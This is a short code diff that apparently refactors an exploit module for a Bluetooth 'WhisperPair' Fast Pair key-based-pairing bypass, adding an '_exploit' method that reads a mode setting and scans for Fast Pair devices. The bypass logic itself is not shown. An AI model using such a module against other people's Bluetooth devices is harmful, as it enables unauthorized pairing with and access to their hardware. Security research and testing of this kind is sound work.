@@ -257,6 +257,13 @@ class Exploit(Exploit):
             print_error("bleak not installed. Run: pip install bleak")
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: WhisperPair Fast Pair plaintext KBP bypass."""
+        mode = str(self.mode).strip().lower()
+        scan_secs = float(int(self.scan_seconds))
+
         if mode == "scan":
             print_status(f"Scanning {scan_secs:.0f}s for Fast Pair devices (0xFE2C)...")
             devices = asyncio.run(_scan_fast_pair_devices(scan_secs))
